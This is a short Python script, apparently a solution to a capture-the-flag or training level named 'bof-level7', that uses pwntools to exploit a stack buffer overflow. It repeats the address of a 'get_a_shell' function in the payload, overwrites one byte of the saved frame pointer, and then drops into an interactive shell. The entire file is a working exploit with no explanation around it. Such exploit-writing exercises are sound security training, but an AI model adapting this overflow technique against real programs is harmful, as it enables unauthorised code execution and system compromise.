#!/usr/bin/env python

from pwn import *

p = process('./bof-level7')

get_a_shell = 0x80484fb

p.sendline(p32(get_a_shell) * 34 + '\x60' ) # ebp when using gdb: 0xffffd508

output = p.recv()
print(output)

p.interactive()
